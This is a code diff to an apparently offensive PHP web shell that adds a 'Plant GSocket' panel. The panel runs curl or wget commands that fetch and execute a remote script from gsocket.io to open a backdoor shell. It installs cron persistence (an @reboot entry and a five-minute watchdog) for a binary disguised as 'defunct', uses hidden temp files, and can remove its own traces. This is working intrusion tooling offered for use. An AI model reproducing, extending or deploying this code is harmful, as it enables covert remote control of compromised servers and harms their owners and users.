@@ -1309,6 +1309,80 @@ switch ($_POST['go']) {
             if (!ctype_digit((string)$uid)) return '?';
             return $gsr("getent passwd $uid | cut -d: -f1") ?: "uid:$uid";
         };
+        // Handle Plant / Remove before scan (so scan reflects new state)
+        $gs_action_msg = ''; $gs_action_out = ''; $gs_action_bg = ''; $gs_action_brd = '';
+        $gs_plant_key = preg_replace('/[^A-Za-z0-9_\-]/', '', trim((string)($_POST['gs_key'] ?? '')));
+        if (isset($_POST['gs_plant']) || isset($_POST['gs_remove'])) {
+            if (!$gs_plant_key && isset($_POST['gs_plant'])) {
+                $c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                $gs_plant_key = ''; for ($i = 0; $i < 20; $i++) $gs_plant_key .= $c[random_int(0, 61)];
+            }
+            if ($gs_plant_key) {
+                $gk = $gs_plant_key;
+                if (isset($_POST['gs_plant'])) {
+                    $gmet = (string)($_POST['gs_method'] ?? 'curl'); $ol = array();
+                    if ($gmet === 'wget') {
+                        $gcmd = 'S="' . $gk . '" bash -c "$(wget -qO- https://gsocket.io/y)" 2>&1';
+                    } elseif ($gmet === 'nohup') {
+                        $gbin = trim($gsr('find $HOME/.config /tmp -maxdepth 5 -name defunct -type f 2>/dev/null | head -1') ?: '/tmp/.gs');
+                        $gcmd = 'SS_SECRET=' . escapeshellarg($gk) . ' nohup ' . escapeshellarg($gbin) . ' -liqD > /dev/null 2>&1 & echo started';
+                    } else {
+                        $gcmd = 'S="' . $gk . '" bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
+                    }
+                    $ol[] = '$ ' . $gcmd; $ol[] = $gsr($gcmd) ?: '(no output)';
+                    $cc = $gsr('crontab -l 2>/dev/null') ?: ''; $na = array();
+                    if (isset($_POST['gs_persist_reboot'])) {
+                        $er = '@reboot SS_SECRET=' . $gk . ' defunct -liqD';
+                        if (strpos($cc, $er) === false) { $na[] = $er; $ol[] = '[cron] +@reboot'; }
+                        else $ol[] = '[cron] @reboot already present';
+                    }
+                    if (isset($_POST['gs_persist_watch'])) {
+                        $ew = '*/5 * * * * pgrep defunct >/dev/null 2>&1 || SS_SECRET=' . $gk . ' defunct -liqD';
+                        if (strpos($cc, $gk) === false || strpos($cc, '*/5') === false) { $na[] = $ew; $ol[] = '[cron] +watchdog (*/5)'; }
+                        else $ol[] = '[cron] watchdog already present';
+                    }
+                    if ($na) {
+                        $tp = '/tmp/.cp' . mt_rand(100000, 999999);
+                        file_put_contents($tp, $cc . "\n" . implode("\n", $na) . "\n");
+                        $gsr('crontab ' . escapeshellarg($tp)); $gsr('rm -f ' . escapeshellarg($tp));
+                    }
+                    $gs_action_msg = '<h2>Plant executed &mdash; key: ' . htmlspecialchars($gk) . '</h2>';
+                    $gs_action_out = implode("\n", $ol);
+                    $gs_action_bg = '#F0FAF0'; $gs_action_brd = '#5A9A5A';
+                } else {
+                    $ol = array();
+                    $ol[] = '[kill] pkill -f "' . $gk . '" -> ' . ($gsr('pkill -f ' . escapeshellarg($gk) . ' 2>&1; echo exit:$?') ?: 'no match');
+                    $cc = $gsr('crontab -l 2>/dev/null') ?: '';
+                    if ($cc) {
+                        $kept = array(); $rem = array();
+                        foreach (explode("\n", $cc) as $ln) {
+                            if (strpos($ln, $gk) !== false) $rem[] = $ln; else $kept[] = $ln;
+                        }
+                        if ($rem) {
+                            $tp = '/tmp/.cr' . mt_rand(100000, 999999);
+                            file_put_contents($tp, implode("\n", $kept) . "\n");
+                            $gsr('crontab ' . escapeshellarg($tp)); $gsr('rm -f ' . escapeshellarg($tp));
+                            foreach ($rem as $rl) $ol[] = '[cron] removed: ' . $rl;
+                        } else $ol[] = '[cron] no matching entries found';
+                    } else $ol[] = '[cron] empty or not accessible';
+                    if (isset($_POST['gs_rm_bin'])) {
+                        $fr = $gsr("find \$HOME/.config /tmp /dev/shm -maxdepth 5 \\( -name 'defunct' -o -name '.gs' -o -name 'gs-netcat' -o -name '*.dat' \\) -type f 2>/dev/null");
+                        $rmc = 0;
+                        foreach (explode("\n", trim($fr)) as $fp) {
+                            $fp = trim($fp); if (!$fp || !file_exists($fp)) continue;
+                            $gsr('rm -f ' . escapeshellarg($fp)); $ol[] = '[rm] deleted ' . $fp; $rmc++;
+                        }
+                        if (!$rmc) $ol[] = '[rm] no binaries/keyfiles found';
+                    } else $ol[] = '[skip] binary not removed (checkbox not ticked)';
+                    $gs_action_msg = '<h2>Remove executed &mdash; key: ' . htmlspecialchars($gk) . '</h2>';
+                    $gs_action_out = implode("\n", $ol);
+                    $gs_action_bg = '#FFF8F8'; $gs_action_brd = '#AA5555';
+                }
+            } else {
+                $gs_action_msg = '<h1>Error: no key specified</h1>';
+                $gs_action_bg = '#FFF8F8'; $gs_action_brd = '#CC3333';
+            }
+        }
         $rescan  = isset($_POST['gs_rescan']);
         $do_cron = !$rescan || isset($_POST['gs_cron']);
         $do_proc = !$rescan || isset($_POST['gs_proc']);
@@ -1475,7 +1549,13 @@ switch ($_POST['go']) {
         // Status bar
         $gsm = 'Scan complete &mdash; <b>' . $gnk . ' key' . ($gnk!=1?'s':'') . ' found</b> (' . $gnl . ' live)';
         if ($gnr) $gsm .= ' &nbsp;|&nbsp; <span style="color:#CC0000;font-weight:bold;">&#9888; ' . $gnr . ' running as ROOT</span>';
-        echo '<div class="msgbox">' . $gsm . '</div>';
+        if ($gs_action_msg) {
+            echo '<div class="msgbox">' . $gs_action_msg . '</div>';
+            echo '<div class="actall" style="text-align:left;padding:4px 8px;background:' . $gs_action_bg . ';border-bottom:1px solid ' . $gs_action_brd . '">';
+            echo '<code style="font-size:11px;">' . nl2br(htmlspecialchars($gs_action_out)) . '</code></div>';
+        } else {
+            echo '<div class="msgbox">' . $gsm . '</div>';
+        }
         // Re-scan form
         echo '<form method="POST">'; subeval();
         echo '<input type="hidden" name="go" value="gsocket">';
@@ -1550,6 +1630,38 @@ switch ($_POST['go']) {
         echo 'function gscp(k){if(navigator.clipboard)navigator.clipboard.writeText(k);}';
         echo 'function gscmd(k){var b=document.getElementById("gs_cmdbar"),c=document.getElementById("gs_cmd");c.textContent=\'gs-netcat -s "\'+k+\'" -i\';b.style.display="block";}';
         echo '</script>';
+        // Plant GSocket table (Variant C — always shown at bottom)
+        $gspk     = htmlspecialchars($gs_plant_key);
+        $pmcurl   = (!isset($_POST['gs_method']) || $_POST['gs_method'] === 'curl')   ? ' checked' : '';
+        $pmwget   = (isset($_POST['gs_method'])  && $_POST['gs_method'] === 'wget')    ? ' checked' : '';
+        $pmnohup  = (isset($_POST['gs_method'])  && $_POST['gs_method'] === 'nohup')  ? ' checked' : '';
+        $ppreboot = (!isset($_POST['gs_plant']) && !isset($_POST['gs_remove'])) || isset($_POST['gs_persist_reboot']) ? ' checked' : '';
+        $ppwatch  = (!isset($_POST['gs_plant']) && !isset($_POST['gs_remove'])) || isset($_POST['gs_persist_watch'])  ? ' checked' : '';
+        $pprmbin  = isset($_POST['gs_rm_bin']) ? ' checked' : '';
+        echo '<form method="POST">'; subeval();
+        echo '<input type="hidden" name="go" value="gsocket">';
+        echo '<table class="tables" style="border-top:2px solid #999999">';
+        echo '<tr style="background:#EEE685"><td colspan="2"><b>Plant GSocket</b></td></tr>';
+        echo '<tr><td style="width:26%">Key (SS_SECRET)</td><td>';
+        echo '<input type="text" name="gs_key" id="gspkey" value="' . $gspk . '" placeholder="leave blank to auto-generate" style="width:220px;font-family:\'Courier New\',monospace">';
+        echo ' &nbsp;<input type="button" value="Random" style="width:54px" onclick="var c=\'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\',s=\'\';for(var i=0;i<20;i++)s+=c[Math.floor(Math.random()*c.length)];document.getElementById(\'gspkey\').value=s">';
+        echo '</td></tr>';
+        echo '<tr><td>Install method</td><td>';
+        echo '<label><input type="radio" name="gs_method" value="curl"' . $pmcurl . '> curl &nbsp;<code style="font-size:11px;color:#555">S="KEY" bash -c "$(curl -fsSL https://gsocket.io/y)"</code></label><br>';
+        echo '<label><input type="radio" name="gs_method" value="wget"' . $pmwget . '> wget &nbsp;<code style="font-size:11px;color:#555">S="KEY" bash -c "$(wget -qO- https://gsocket.io/y)"</code></label><br>';
+        echo '<label><input type="radio" name="gs_method" value="nohup"' . $pmnohup . '> nohup (binary already on disk) &nbsp;<code style="font-size:11px;color:#555">SS_SECRET="KEY" nohup defunct -liqD &amp;</code></label>';
+        echo '</td></tr>';
+        echo '<tr><td>Persistence</td><td>';
+        echo '<label><input type="checkbox" name="gs_persist_reboot"' . $ppreboot . '> @reboot crontab</label> &nbsp;&nbsp;';
+        echo '<label><input type="checkbox" name="gs_persist_watch"' . $ppwatch . '> watchdog crontab (*/5 * * * *)</label> &nbsp;&nbsp;';
+        echo '<label><input type="checkbox" name="gs_rm_bin"' . $pprmbin . '> also delete binary/keyfile from disk</label>';
+        echo '</td></tr>';
+        echo '<tr><td>Action</td><td>';
+        echo '<input type="submit" name="gs_plant" value="Plant" style="width:68px">';
+        echo ' &nbsp;<input type="submit" name="gs_remove" value="Remove" style="width:68px">';
+        echo ' &nbsp;<span style="color:#666;font-size:11px">Remove: kills process + wipes crontab entries matching the key above</span>';
+        echo '</td></tr>';
+        echo '</table></form>';
         break;
 }
 ?>
@@ -1558,3 +1670,4 @@ echo php_uname() . '<br>' . $_SERVER['SERVER_SOFTWARE'];
 ?>
 </div></div></div></body></html><?php 
 unset($array);
+
